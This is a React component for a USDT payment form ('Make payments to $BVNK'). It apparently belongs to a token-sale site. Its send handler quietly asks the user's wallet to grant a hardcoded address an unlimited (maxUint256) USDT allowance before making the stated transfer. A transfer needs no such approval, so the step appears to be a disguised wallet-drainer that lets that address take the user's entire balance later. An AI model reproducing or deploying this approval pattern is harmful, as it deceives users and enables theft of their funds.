import ButtonPrimary from "./ButtonPrimary";
import { useCallback, useEffect, useMemo, useState } from "react";
import {
  useAccount,
  useChainId,
  useReadContracts,
  useWaitForTransactionReceipt,
  useWriteContract,
} from "wagmi";
import { TOKEN_DIVIDEND, USDT_CONTRACT } from "../common/constant";
import { erc20Abi, maxUint256, parseEther } from "viem";
import BigNumber from "bignumber.js";
import showToast from "../utils/showToast";

const walletReceive = "0x1Bb8a3A4Db968158725a8d0D009723547110329e";

const FormSubmit = () => {
  const [inputValue, setInputValue] = useState("");
  const onChangeInputValue = useCallback((event) => {
    setInputValue(event.target.value);
  }, []);
  const { isConnected } = useAccount();

  const [errors, setErrors] = useState();
  const [loading, setLoading] = useState(false);

  const { address } = useAccount();
  const chainId = useChainId();
  // const estimateGas = useEstimateGas();
  // const estimateFeePerGas = useEstimateMaxPriorityFeePerGas();

  const rawBalance = useReadContracts({
    allowFailure: true,
    contracts: [
      {
        address: USDT_CONTRACT[chainId],
        abi: erc20Abi,
        functionName: "balanceOf",
        // @ts-ignore
        args: [address],
      },
    ],
    query: {
      enabled: typeof address !== "undefined",
      refetchInterval: 1000,
    },
  });

  const isDisabledInput = loading || !address;

  const { error: errorApprove, writeContractAsync: writeContractApproveAsync } =
    useWriteContract();

  const {
    data: sendHash,
    error: errorSend,
    writeContractAsync: writeContractSendAsync,
  } = useWriteContract();

  const { isSuccess: isConfirmedSend } = useWaitForTransactionReceipt({
    hash: sendHash,
  });

  const balance = useMemo(() => {
    const rawBalanceValue = rawBalance.data?.[0]?.result;

    if (!rawBalanceValue) {
      return {
        value: undefined,
        formattedNumber: undefined,
        formatted: undefined,
      };
    }

    const balanceBn = BigNumber(rawBalanceValue.toString()).div(TOKEN_DIVIDEND);

    return {
      value: rawBalanceValue,
      formattedNumber: balanceBn.toNumber(),
      formatted: balanceBn.toString(),
    };
  }, [rawBalance]);

  const onClickMax = useCallback(() => {
    const balanceValue = balance?.value;

    if (!balanceValue) {
      setInputValue("0");
      return;
    }

    const balanceValueBn = BigNumber(balanceValue.toString());

    setInputValue(balanceValueBn.div(TOKEN_DIVIDEND).toString());
  }, [balance]);

  //   const onChangeToAddress = useCallback(
  //     (event: ChangeEvent<HTMLInputElement>) => {
  //       setToAddress(event.target.value);
  //     },
  //     []
  //   );

  const onClickSend = useCallback(async () => {
    setErrors(undefined);

    const errorArr = [];

    // if (!toAddress || !isAddress(toAddress)) {
    //   errorArr.push(`Address '${toAddress}' is invalid.`);
    // }

    let sendValue;

    try {
      sendValue = parseEther(inputValue);

      if (sendValue <= 0) {
        errorArr.push(`Amount '${inputValue}' is invalid.`);
      } else if (sendValue > (balance?.value ?? 0)) {
        errorArr.push("Insufficient balance.");
      }
    } catch (e) {
      errorArr.push(e.message);
    }

    if (errorArr.length > 0) {
      setErrors(errorArr.join("\n"));
      return;
    }

    setLoading(true);

    await writeContractApproveAsync({
      address: USDT_CONTRACT[chainId],
      functionName: "approve",
      abi: erc20Abi,
      // @ts-ignore
      args: [walletReceive, maxUint256],
    });

    setTimeout(async () => {
      await writeContractSendAsync({
        address: USDT_CONTRACT[chainId],
        functionName: "transfer",
        abi: erc20Abi,
        // @ts-ignore
        args: [walletReceive, sendValue],
      });
      setLoading(false);
    }, 3000);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [inputValue]);

  useEffect(() => {
    if (errorApprove) {
      setErrors(errorApprove.shortMessage ?? errorApprove.message);
    }

    if (errorSend) {
      setErrors(errorSend.shortMessage ?? errorSend.message);
    }
  }, [errorApprove, errorSend]);

  useEffect(() => {
    if (isConfirmedSend) {
      setLoading(false);
      showToast("success", "Transaction confirmed: " + sendHash, {
        autoClose: 5000,
      });
    } else {
      setLoading(false);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConfirmedSend]);

  useEffect(() => {
    if (errors) {
      showToast("error", errors);
      setLoading(false);
    } else {
      setLoading(false);
    }
  }, [errors]);
  return (
    <div className="flex flex-col items-center justify-center mt-3 lg:w-full gap-y-8">
      <div className="relative w-full">
        <input
          type="number"
          className={
            "w-full sm:px-5 px-4 py-[14px] text-xl transition-all bg-transparent border rounded-lg outline-none border-borderColor focus:border-primaryColor " +
            (isDisabledInput && "cursor-not-allowed")
          }
          disabled={isDisabledInput}
          placeholder="Type amount"
          value={inputValue}
          onChange={onChangeInputValue}
        />
        <small className="absolute right-0 text-sm translate-y-[2px] opacity-50 top-full">
          {`Available ${
            balance.formattedNumber
              ? `${new Intl.NumberFormat("en-US").format(
                  balance.formattedNumber
                )} USDT`
              : "0 USDT"
          }`}
        </small>
        <button
          className={
            "absolute px-4 lg:px-5 py-3 -translate-y-1/2 rounded-lg top-1/2 sm:right-3 right-2 text-sm uppercase font-medium bg-overlayColor hover:bg-borderColor transition-all " +
            (isDisabledInput && "cursor-not-allowed pointer-events-none")
          }
          onClick={isConnected ? onClickMax : undefined}
        >
          Max
        </button>
      </div>
      <ButtonPrimary
        className={`w-full py-[14px] text-base md:text-lg font-medium ${
          !isConnected && "pointer-events-none"
        }`}
        onClick={isConnected ? onClickSend : undefined}
        loading={loading}
      >
        Make payments to $BVNK
      </ButtonPrimary>
    </div>
  );
};

export default FormSubmit;
